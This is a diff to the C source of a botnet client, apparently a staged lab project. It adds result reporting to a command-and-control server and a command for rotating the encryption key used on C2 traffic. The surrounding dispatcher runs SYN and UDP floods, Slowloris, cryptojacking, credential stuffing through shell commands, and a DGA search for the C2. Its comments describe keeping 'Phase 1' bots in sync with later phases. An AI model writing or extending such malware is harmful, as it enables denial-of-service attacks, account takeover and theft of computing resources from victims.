@@ -68,11 +68,20 @@ static unsigned char g_aes_key[16];
 static int           g_aes_ready = 0;
 
 /* ── Crypto helpers ──────────────────────────────────────────── */
-static void derive_key(void) {
+/* Derive a 16-byte AES key from an arbitrary secret string and store it
+ * in g_aes_key.  This is called at startup (with SHARED_SECRET) and again
+ * whenever an update_secret command is received so Phase 1 bots can
+ * participate in the same key-rotation workflow as Phase 2/3 bots.     */
+static void derive_key_from_secret(const char *secret) {
     unsigned char h[SHA256_DIGEST_LENGTH];
-    SHA256((const unsigned char *)SHARED_SECRET, strlen(SHARED_SECRET), h);
+    SHA256((const unsigned char *)secret, strlen(secret), h);
     memcpy(g_aes_key, h, 16);
     g_aes_ready = 1;
+}
+
+/* Convenience wrapper: derive from the compiled-in default. */
+static void derive_key(void) {
+    derive_key_from_secret(SHARED_SECRET);
 }
 
 static void derive_iv(const char *nonce, unsigned char *iv) {
@@ -422,6 +431,24 @@ void bot_register(void) {
     else printf("[BOT] Registration failed (is C2 running?)\n");
 }
 
+/* ── Result reporting ───────────────────────────────────────── */
+/* POST a task-completion notice to /result so the C2 operator can
+ * correlate task dispatch with execution outcomes per-bot.
+ * task_type : the command type string (e.g. "syn_flood")
+ * status    : short human-readable outcome ("completed", "started", etc.)  */
+void bot_post_result(const char *task_type, const char *status) {
+    char body[320];
+    snprintf(body, sizeof(body),
+             "{"bot_id":"%s","result":{"type":"%s","status":"%s"}}",
+             g_bot_id, task_type, status);
+    char resp[RESP_BUF] = {0};
+    int r = http_post(C2_IP, C2_PORT, "/result", body, resp, sizeof(resp));
+    if (r > 0)
+        printf("[BOT] Result posted: type=%s status=%s\n", task_type, status);
+    else
+        printf("[BOT] Result post failed (C2 unreachable?)\n");
+}
+
 /* ── Task dispatcher ─────────────────────────────────────────── */
 static void dispatch_task(const char *task_json) {
     char type[32]      = {0};
@@ -437,9 +464,11 @@ static void dispatch_task(const char *task_json) {
 
     if (strcmp(type, "syn_flood") == 0) {
         syn_flood(target_ip, port, duration);
+        bot_post_result("syn_flood", "completed");
 
     } else if (strcmp(type, "udp_flood") == 0) {
         udp_flood(target_ip, port, duration);
+        bot_post_result("udp_flood", "completed");
 
     } else if (strcmp(type, "slowloris") == 0) {
         SlowlorisArgs *a = malloc(sizeof(SlowlorisArgs));
@@ -450,6 +479,7 @@ static void dispatch_task(const char *task_json) {
         pthread_t t;
         pthread_create(&t, NULL, slowloris_thread, a);
         pthread_detach(t);
+        bot_post_result("slowloris", "started");
 
     } else if (strcmp(type, "cryptojack") == 0) {
         /* CPU fraction from task JSON — default 0.25 */
@@ -464,6 +494,7 @@ static void dispatch_task(const char *task_json) {
         pthread_t t;
         pthread_create(&t, NULL, cryptojack_thread, a);
         pthread_detach(t);
+        bot_post_result("cryptojack", "started");
 
     } else if (strcmp(type, "cred_stuffing") == 0) {
         /*
@@ -510,14 +541,37 @@ static void dispatch_task(const char *task_json) {
         }
         printf("[BOT] Spawning credential stuffing: %s\n", cmd);
         system(cmd);
+        bot_post_result("cred_stuffing", "started");
 
     } else if (strcmp(type, "dga_search") == 0) {
         /* Trigger DGA domain search (spawns Python dga.py) */
         printf("[BOT] Triggering DGA C2 search\n");
         system("python3 dga.py &");
+        bot_post_result("dga_search", "started");
 
     } else if (strcmp(type, "idle") == 0 || type[0] == '\0') {
         /* no-op */
+
+    /* ── Key rotation (Phase 1 parity with Phase 2/3) ───────────────────
+     * The C2 server's POST /rotate_key sends an update_secret task to every
+     * registered bot (encrypted with the CURRENT key so bots can decrypt it)
+     * and then switches to the new key.  Bots that handle this command call
+     * derive_key_from_secret() to adopt the same new key, keeping Phase 1
+     * bots in sync with Phase 2/3 bots through the entire rotation cycle.  */
+    } else if (strcmp(type, "update_secret") == 0) {
+        char new_secret[64] = {0};
+        json_str_field(task_json, "secret", new_secret, sizeof(new_secret));
+        if (strlen(new_secret) >= 8) {
+            derive_key_from_secret(new_secret);
+            printf("[BOT] AES key rotated. New key: ");
+            for (int i = 0; i < 16; i++) printf("%02x", g_aes_key[i]);
+            printf("\n");
+            bot_post_result("update_secret", "key_rotated");
+        } else {
+            printf("[BOT] update_secret ignored: secret must be >=8 chars\n");
+            bot_post_result("update_secret", "rejected_too_short");
+        }
+
     } else {
         printf("[BOT] Unknown task type: %s\n", type);
     }
